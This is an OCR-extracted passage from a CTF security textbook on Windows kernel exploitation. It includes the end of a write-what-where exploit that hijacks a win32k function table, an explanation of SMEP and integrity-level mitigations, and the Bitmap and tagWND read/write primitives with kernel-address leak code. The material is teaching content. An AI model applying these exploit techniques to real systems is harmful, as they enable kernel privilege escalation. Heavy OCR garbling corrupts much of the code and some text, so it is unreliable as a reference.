CONTROL_PACKET Packet = (o) :
DNORD BytesReturn = 0 ;
LPVOID Address = NULL;
PVOID NtBase = NULL;
NtBase = leak_nt_nodule (1 ;
hDevice = CreateFi1e [DEVICE_SYMBOLIC_NAME, GENERIC_ALL, 0, 0,
OPEN_EXISTING, PIL&_ATTRIBUTE_SYSTEM, O1 :
if (hDevice == INVALID_HANDLE_VALUE) {
printf ("CreatePile = vd\n*, ErrorCode) ;
DWORD ErrorCode = GetLastError () ;
retuzn 0;
Address = VirtualA11oc (NULL, 0x1000, NEM_CoMMIT,
PAGE_EXECUTE_READNRITE) ;
Rt1CopyMemory (Address, *\,xCC`,xCC*, 2) :
Packcet . Parameter ._AAW. Where = (INT64) NtBase + Ox2d5 670 ;
Packet . Parameter ._AAW. What = ( INT64) Address;
if (!DeviceIoControl (hDevice, WAA_CTL_CODE, &Packet, sizeof
(Packet) ,
&Packet, sizeof (Packet) , sBytesReturn, 0)> {
printf ("DeviceIoControl = vd\,n*, ErrozCode) ;
DWORD ErrorCode = GetLastError () ;
return 0;
D3DKHTAcquireKeyedMutex (NULL) 
systen(*pause*) ;
return 0;
In this exploit, the base address of the win32k.sys module is leaked through
NtQuerySystemlnformation, and then the address of the function table is calculated
and hijacked by writing arbitrary addresses.
6.9.2.6  Kernel Mitigation and Reading and Writing Proto-Language
Since Windows 7, each new generation of Windows operating system releases has
more added mitigation measures for kemel vulnerability protection, such as NULL
---
## Page 555
542
6PWN
31(63)
2221 20
PSS
81716151413121110
Reserved
SV
P
CR4
OSXSAVE
FSGSBASE
-OSFXSR
PCIDE
OSXMMEXCPT
Fig, 6.60 The structure of SMEP
Instruction fetches from user-mode addresses.
Access rights depend on the values of CR4.SMEP:
I CR4.SMEP = 0, acoess rights dpend on the paging mode and the value of [A32_EFERNXE:
Fer 32-bit paging or if IA32_EFER.NXE = 0, instructions may be fetched from any user-mode
addres5.
For PAE paing orIA32e paing with A32_EFER,NOE = 1, Instrutions may be fetched frmay
translation for which the XD flag is 1 In any paging-structure entry controlling the translation
 If CR4.SMEP = 1, Iinstructions may not be fetched from any user-mode adress.
Fig, 6.61 The meaning of CR4.SMEP
Dereference Protection, NonPagedPoolNX, Intel SMEP, Intel Secure Key, int Ox29,
and Win32K Filter, etc. SMEP (Supervisor Mode Execution Protection) is a vulner-
ability mitigation measure introduced by Intel in CPUs to prevent the execution of
code in the Ring3 address space in privileged Ring0 mode. Intel introduced the
SMEP feature in Ivy Bridge in 2011, but Windows OS did not support it until
Windows 8.
Let’s look at the details of the SMEP. First, Intel sets the SMEP switch at bit 20 of
the CR4 register, see Fig. 6.60. If SMEP is enabled, attempts to execute code in the
user-mode address space with Ring0 privileges will be rejected, see Fig. 6.61
At the same time, since Windows 8.1, there are restrictions on kernel address 
disclosure functions, which are implemented through process integrity level control.
In Windows operating systems, the security of processes or other kernel objects are
govemed by a Discretionary Access Control Label (DACL). The process integrity
level can be considered as a special item of the DACL, which is also located in the
process token.
The process integrity levels are System, High, Medium, Low, and untrusted, and
for kermel exploitation, they mainly limit the access to kermel information through
these functions at lower integrity levels.
As a result of these mitigations, on the one hand, it is difficult to leak kermel
addresses and on the other hand, it is difficult to allocate appropriate memory for the
shellcode, although it is still possible to exploit the kernel address vulnerability in
combination with a memory corruption vulnerability, the cost is relatively high.
Therefore, attackers consider not using the shellcode when exploiting the kernel, but
rather seek to exploit it by seeking to obtain read and write primitives, i.e., to convert
the vulnerability into an unrestricted arbitrary address (absolute or relative) read and
---
## Page 556
6.9 Windows Kemel PWN
543
write operation, and then achieve the final exploitation by reading and writing any
address.
Here we briefly introduce two classical kernel read-write primitives that have
appeared in history: the Bitmap primitive and the tag WND primitive.
From the previous analysis, it is easy to think that to achieve the effect of arbitrary
kermel memory read and write, it is just to find some kernel objects in the kermel
space. These kermel objects need to have some pointer domain or length fields, such
as in the browser exploitation techniques often use Array as a way to get the memory
read and write primitive because Array objects usually have a length field and a
pointer to represent the data storage buffer. When the pointer or length field of these
objects is controlled, the purpose of arbitrary memory reads and writes is achieved.
Of course, the target object in kermel space is not only required to meet the conditions
but also needs to be able to be accessed in the user space. Bitmap is one such GDI
object with the following structure, where there exists a pointer domain pvScan0.
typedef struct _SURFOBJ (
DHSURF dhsurf ;
HSURF hsurf;
DHPD&V dhpdev;
SIZEL sizlBitmap;
HDEV hdev;
ULONG cjBits;
:oueosad aI0Ad
PVOID pvBits;
LONG 1De1ta;
ULONG iBitmapFormat ;
ULONG iUniq;
USHORT fjBitnap:
USHORT iType;
} SURFOBJ;
SetBitmapBits is a Win32 API function derived from the gdi32.dll module, which
can be called directly from the user state. The kernel implementation of this function
is NtGdiSetBitmapBits, where the following code exists.
pjDst = psurf - >Surfobj ·pvScan0;
pjSxc = pvBits;
1DeltaDst = psurf - >Surfobj . 1Delta;
1DeltaSrc = WIDTH_BYTEs_ALIGN16 (nNidth, cBitsPixel) ;
while (nHeight--) {
mencpy (pjDst, pjSrc, 1DeltaSrc) :
pjSrc +- 1DeltaSrc;
sgeatoat =+ asa[d
It can be seen that the pvScanO parameter in the SURFOBJ object is used directly
as a pointer to the buffer. Similarly, a similar code exists in the Win32 API function
---
## Page 557
544
6PWN
GetBitmapBits corresponding to the kemel function NtGdiGetBitmapBits as fol-
lows, which reads data directly from the pvScan0 domain as a buffer pointer and
returns the user state.
pjSrc = psurf - >Surfobj pvScan0;
pDst = pvBits;
1DeltaSrc = psurf - >Surfobj . 1Delta;
1DeltaDst = WIDTH_BYTES_ALIGN16 (nNidth, cBitsPixe1) ;
while (nHeight--) {
pjSrc += 1DeltaSrc;
Rt1CopyMemory (pjDst, pjSrc, 1De1taDst) :
pjDat += 1DeltaDst;
Similar to Bitmap, tagWND is a GUI object that represents a form in the kemel
with the following structure.
typedef struet tagwND (
struct tagWND +chi1d;
struct tagWND +parent ;
struct tagWND *next ;
struct tagWND *owmer ;
void *pHScro11;
void *pVScro11;
HINSTANCg hInstance ;
HNND hvndSe1f ;
DNORD dvExStyle;
DNORD dvStyle;
UINT vIDnenu;
HMENU hSysMenu;
RECT rectNindou;
RECT rectClient;
DNORD cbHndExtra;
LPNSTR text;
DNORD flage;
) eD;
DHORD vExtra [1] :
In the design of various data structures in Windows, variable-length buffers are
usually represented as an array of one unit length and supplemented by data-length
fields. In tagWND, the wExtra field represents a buffer whose tail is of variable
length, and the cbWndExtra field represents a length field. By modifying these two
fields, you can read and write arbitrary addresses.
The PEB (Process Environment Block) is located in the user space of a process
and holds a lot of information about the process. In the user state, the segment
register GS always points to the TEB, so the location of the PEB can be easily
obtained. In the PEB, there exists a field named GdiSharedHandleTable, which is a
structured array, see Fig. 6.62.
---
## Page 558
6.9 Windows Kemel PWN
545
+ex0e8 NumberOfHeaps
+xCec MaximumNumberOfHeaps:Uint4B
：Uint4B
+0xofe ProcessHeaps
:Ptr64Ptr64Void
+0xof8GdiSharedHandleTable:Ptr64 void
+0x10o ProcessStarterHelper:Ptr64 Void
+0x108 GdiDCAttributeList:Uint4B
+0x10c Padding3
：[4]uchar
+0x11e LoaderLock
：Ptr64 _RTL_CRITICAL_SECTION
+ex118 0SMajorVersion
：Uint4B
+0x12e 0SBui1dNumber
+0x11c oSMinorVersion
：Uint4B
：Uint2B
Fig, 6.62 The structure array of PEB
The structure in the GdiSharedHandleTable array is GDICELL64.
typedef atruct {
PVoID64 pKernelAddress;
USHoRT vProcessId;
:xoddna ±aoHSn
USHORT vCount ;
USHORT vType:
) GDICBLL64 ;
PVOID64 pUserAddress;
where the pKernelAddress field points to the address of the Bitmap object. The
leaked example code is as follows.
typedef atruct {
PVOID64 pKernelAddress;
USHORT vProcessId;
:xoddnR a0HS
USHORT vCount ;
USHORT VType:
PVOID64 pUserAddress;
} GDICELL64 , *PGDICELL64 ;
PVOID leak_bitmap (VOID) {
PGDICSLL64 pGdiSharedHandleTable = NULL;
INT64 PebAddr = 0, TebAddr = 0 ;
HBITHAP BitmapHandle = 0;
INT64 ArrayIndex = 0;
BitmapHandle = CreateBitmap (0x64, 1, 1, 32, NULL) :
TebAddr = (INT64)NtCurrentTeb () :
PebAddr = * (PINT64) (TebAddr+ 0x60) ;
pGdiSharedHandleTab1e = * (PGDICELL64*) (PebAddr + 0x0f8) ;
return pGdiSharedHandleTable [ArrayIndex] pKeznelAddress ;
ArrayIndex = (INT64)BitmapHandle & 0xffff ;
---
## Page 559
546
6PWN
Fig, 6.63 The structure
e: kd> dt nt1_TEB
83 Jo
+0x000 NtTib
+exe38 EnvironmentPointer : Ptr64 Void
:_NT_TIB
+ex84e ClientId
+exe5e ActiveRpcHandle: Ptr64 Void
:_CLIENT_ID
+exe58 ThreadLocalStoragePointer : Ptr64 Void
+ex06e ProcessEnvironmentBlock : Ptr64 _PEB
+0xodo HeapSegmentCommit:Uint88
+0xod8 HeapDeCommitTotalFreeThreshold:Uint8B
+0xoeo HeapDeCommitFreeBlockThreshold :Uint8B
+0x0e8 NumberOfHeaps
：Uint4B
+0x0ec MaximumNumberofHeaps :Uint4B
+0xofe ProcessHeaps
:Ptr64 Ptr64 Void
+0xof8 GdiSharedHandleTable : Ptr64 void
+0x10o ProcessStarterHelper : Ptr64 void
+0x108 GdiDcAttributeList:Uint4B
+0x10c Padding3
：[4]uchar
+0x110 LoaderLock
：Ptr64 _RTL_CRITICAL_SECTION
+0x118 oSMajorVersion
：Uint4B
+0x11c 0sMinorVersion
+0x120 0SBui1dNumber
：Uint4B
：Uint2B
+0x122 0sCS0Version
：Uint2B
+0x124 0sPlatformId
：Uint4B
：Uint4B
+0x128 ImageSubsystem
+0x12c ImageSubsystemMajorVersion:uint4B
+0x13o ImageSubsystemMinorversion :uint4B
+0x134 Padding4
+0x138 ActiveProcessAffinityMask : Uint8B
：[4]uchar
Fig, 6.64 The structure of TEB
The offset Ox60 bytes of the ProcessEnvironmentBlock field in the TEB structure
points to the associated PEB, see Fig. 6.63.
The offset of the GdiSharedHandleTable field in the TEB structure is Oxf8, see
Fig. 6.64.
The CreateBitmap function returns an array of index values in the lower bit of the
handle.
A global pointer variable named gSharedlnfo exists in the user32.dll module.
typedef struct _SHAREDINFO 
PSERVERINFO psi;
ULONG_PTR HeEntrySize;
PHANDL&ENTRY aheList ;
PDISPLAYINFO pDisplayInfo;
ULONG_PTR ulSharedDelta;
NNDHSG avmContro1 [31] ;
NNDHSG DefHindowMsgs;
---
## Page 560
6.10 From CTF to Real-World PWNs
547
} SHAREDINFO, *PSHAREDINFO;
NNDKSG DefNindowSpecHsg=;
The aheList field points to a series of HANDLEENTRY structures that are
actually mapped directly from kermel space so that in this structure the phead field
actually points to the address of the UserHandleTable.
typedef struct _HANDLEENTRY {
PHEAD phead;
/ Pointer to the Object .
BYT& brype:
PVOID pOvner;
/ / object handle type
// PTI or PPI
BYTE bFlags;
// Flaga
}HANDL&RNTRY, *PHE;
NORD vUn1q;
// Access count.
The code for the entire leak process is as follows.
PVOID leak_tagHND (VOID) {
HMODUL& ModuleHandle = NULL;
PSHAREDINFO gSharedInfoPtr = NULL;
ModuleHandle = LoadLibrary (L"user32 . dl1") ;
gSharedInfoPtr = GetProcAddress (ModuleKandle, "gSharedInfo") ;
return gSharedInfoPtr- >aheList ;
gSharedlnfo is a variable exported by the user32 module and can be retrieved
directly. It is also relatively simple and will not be described in detail.
6.9.3 References
BlackHat USA 2017: Taking Windows 10 Kernel Exploitation To The Next Level
Defcon 25: Demystifying Kernel Exploitation By Abusing GDI Objects
BlackHat USA 2016: Attacking Windows By Windows
ReactOS Project: ReactOS Project Wiki
Pavel Yosifovich, Alex lonescu, Mark Russinovich: Windows Internals
Intel: Intel& 64 and IA-32 Architectures Software Developer’s Manual
6.10 From CTF to Real-World PWNs
CTF has been in existence for more than 20 years, and even the experienced “old
sticks" have grown up from newcomers. Just like e-sports players will eventually
retire, most CTF players will also choose to fade out as they graduate and can no
---
## Page 561
548
6PWN
longer devote too much energy to competitions. Not playing competitively does not
mean that the “old stick" has given up on information security. On the contrary, they
tum to the real world as a big CTF, with real software as their challenge, to find the
real vulnerabilities.
Compared to CTF challenges, real-world vulnerability mining is a lot differen.
CTF participants who are new to the challenge often find it difficult to adapt. For
those who have been exposed to CTF and have already established themselves in the
PWN direction, the most important thing to do in real-world vulnerability mining for
the first time is to be patient, as a CTF match usually lasts about 48 h due to the
format, while a single PWN challenge can be solved in a much shorter time, often
within 24 h. This requires the player to quickly identify vulnerabilities and write
code to exploit them. However, a few days of fruitless research on real-world, large,
and complex programs can wear down a person’s patience so much that they
eventually give up. To deal with these large and complex programs in the real
world, one needs to be prepared to invest time in months and even years. Also,
CTF challenges are solvable, but real software is not. It is not uncommon for
vulnerabilities to be found but not exploited for various reasons. Only by being
snsau jag no. ueo Suaasiad pue puaed
The second difference between CTF and reality is the target environment. Due to
the constraints of the competition conditions, the PWN challenges in CTF focus on
Linux network services, i.e., menu challenges. However, in reality, attackers have to
face a more complex and bizarre environment, in which Windows Server, OS kernel,
browser, IoT, etc. may appear, and every vulnerability mining is a new challenge.
The only way to avoid stopping in the process of exploiting vulnerabilities is to keep
leaming and keep the courage to challenge the unknown.
I've done vulnerability mining in CS: GO games for a while, and Ill use this
example to share the difference between real-world vulnerability mining and CTF.
First, the vulnerability mining process relies more on information gathering.
Although all kinds of information are collected in CTF competitions, the reality is
that it takes days or even weeks to leam and understand the target environment and
the knowledge of architecture used. For example, before you start digging for
vulnerabilities in CS: GO, you need to know that the game is made with the Origins
engine, and you need to have a thorough knowledge of the Origins engine, including
development manuals, previous vulnerabilities, research, and analysis of the Origins
engine published in conferences and blogs, and even reverse engineering of the
game by add-on writers.
Secondly, the attack surface analysis: the CTF challenges are programs written
specifically for exploiting vulnerabilities without much extra code, and due to cost
constraints, the amount of code is incomparable to real-world software. For the CTF
PWN challenges, the participant will generally analyze the program from start to
finish, find the vulnerability, and then start scripting the exploit. Real-world vulner-
ability mining often requires attack surface analysis. This is because real-world
software is often very large, and much of the code is not accessible to attack. For
example, some software functions require special configuration to use, and some
network services that require authentication can only be used with limited
---
## Page 562
6.10  From CTF to Real-World PWNs
549